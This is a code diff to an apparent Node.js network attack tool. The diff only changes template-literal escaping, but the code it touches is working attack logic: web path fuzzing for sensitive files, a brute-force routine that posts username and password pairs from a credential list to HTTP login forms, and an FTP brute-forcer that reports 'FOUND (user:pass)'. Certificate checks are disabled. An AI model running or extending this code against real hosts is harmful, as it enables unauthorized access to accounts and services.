@@ -30,7 +30,7 @@ async function webFuzz(ip, port, isHttps) {
     for (const path of SENSITIVE_PATHS) {
         await withTimeout(new Promise((resolve) => {
             const req = client.get({ host: ip, port: port, path: path, rejectUnauthorized: false }, (res) => {
-                if ([200, 403, 401].includes(res.statusCode)) found.push(\`\${path} [\${res.statusCode}]\`);
+                if ([200, 403, 401].includes(res.statusCode)) found.push(`${path} [${res.statusCode}]`);
                 res.resume(); resolve();
             });
             req.on('error', () => resolve());
@@ -50,7 +50,7 @@ async function bruteForceHttp(ip, port, isHttps, htmlData, credsList) {
         const client = isHttps ? https : http;
         for (const cred of credsList) {
             const [u, p] = cred.split(':');
-            const postData = \`\${textMatch[2]}=\${encodeURIComponent(u)}&\${passMatch[2]}=\${encodeURIComponent(p)}\`;
+            const postData = `${textMatch[2]}=${encodeURIComponent(u)}&${passMatch[2]}=${encodeURIComponent(p)}`;
             const success = await new Promise((res) => {
                 const req = client.request({
                     host: ip, port: port, path: postUrl, method: 'POST', rejectUnauthorized: false,
@@ -65,7 +65,7 @@ async function bruteForceHttp(ip, port, isHttps, htmlData, credsList) {
                 req.on('error', () => res(false));
                 req.write(postData); req.end();
             });
-            if (success) return resolve(\`FOUND (\${u}:\${p})\`);
+            if (success) return resolve(`FOUND (${u}:${p})`);
         }
         resolve(null);
     });
@@ -80,14 +80,14 @@ async function bruteForceFtp(ip, credsList) {
             let step = 0;
             client.on('data', (data) => {
                 const resp = data.toString();
-                if (step === 0 && resp.includes('220')) { client.write(\`USER \${u}\\r\\n\`); step++; }
-                else if (step === 1 && resp.includes('331')) { client.write(\`PASS \${p}\\r\\n\`); step++; }
+                if (step === 0 && resp.includes('220')) { client.write(`USER ${u}\\r\\n`); step++; }
+                else if (step === 1 && resp.includes('331')) { client.write(`PASS ${p}\\r\\n`); step++; }
                 else if (step === 2) { resolve(resp.includes('230')); client.destroy(); }
             });
             client.on('error', () => { client.destroy(); resolve(false); });
             client.on('timeout', () => { client.destroy(); resolve(false); });
         });
-        if (success) return \`FOUND (\${u}:\${p})\`;
+        if (success) return `FOUND (${u}:${p})`;
     }
     return null;
 }
